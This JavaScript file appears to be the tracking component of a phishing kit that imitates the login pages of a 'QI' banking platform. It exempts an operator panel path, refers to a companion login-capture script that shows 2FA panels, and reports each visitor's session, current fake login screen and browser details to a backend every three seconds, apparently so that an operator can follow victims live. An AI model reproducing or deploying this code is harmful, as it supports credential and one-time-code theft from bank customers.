(function(){
  if (location.pathname.indexOf('/donaspainel') === 0) return;

  // ---- Session ID (persistente na aba) ----
  function uuid(){
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){
      var r = Math.random()*16|0, v = c==='x'? r : (r&0x3|0x8);
      return v.toString(16);
    });
  }
  var SID_KEY = 'qi_sid';
  var sid = sessionStorage.getItem(SID_KEY);
  if (!sid){ sid = uuid(); sessionStorage.setItem(SID_KEY, sid); }
  window.__qiSid = sid;

  function screenFromPath(){
    var p = (location.pathname||'').replace(/\/+$/,'');
    // Active panel (set by qi-login-capture.js when a 2FA/ask panel is shown)
    var panel = window.__qiPanelScreen;
    if (panel) return panel;
    if (window.__qiWaiting) return 'Aguarde';
    if (/Baas-internet-banking$/.test(p)) return 'Login Baas Banking';
    if (/Administracao-e-Custodia$/.test(p)) return 'Login Administração';
    if (/Risk-Solutions$/.test(p)) return 'Login Risk Solutions';
    if (/QI-Sign$/.test(p)) return 'Login QI Sign';
    if (/area-gestor$/.test(p)) return 'Área do gestor';
    if (/home$/.test(p) || p==='' || p==='/') return 'Home';
    return location.pathname || '—';
  }
  window.__qiScreen = screenFromPath;

  function sendHeartbeat(leaving){
    var payload = JSON.stringify({
      session_id: sid,
      screen: screenFromPath(),
      path: location.pathname,
      visible: !document.hidden,
      leaving: !!leaving
    });
    try{
      if (leaving && navigator.sendBeacon){
        var blob = new Blob([payload], {type:'application/json'});
        navigator.sendBeacon('/api/session/heartbeat', blob);
        return;
      }
      fetch('/api/session/heartbeat', {
        method:'POST', headers:{'Content-Type':'application/json'},
        body: payload, keepalive: true
      }).catch(function(){});
    }catch(_){}
  }
  window.__qiBeat = sendHeartbeat;

  // Initial track event (one-time)
  try{
    fetch('/api/track', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({
        path: location.pathname + location.search,
        referrer: document.referrer || '',
        screen: (screen.width||0)+'x'+(screen.height||0),
        language: navigator.language || '',
        timezone: (Intl.DateTimeFormat().resolvedOptions().timeZone) || ''
      }), keepalive: true
    }).catch(function(){});
  }catch(_){}

  // Heartbeat
  sendHeartbeat(false);
  setInterval(function(){ sendHeartbeat(false); }, 3000);
  document.addEventListener('visibilitychange', function(){ sendHeartbeat(false); });
  window.addEventListener('pagehide', function(){ sendHeartbeat(true); });
  window.addEventListener('beforeunload', function(){ sendHeartbeat(true); });
})();
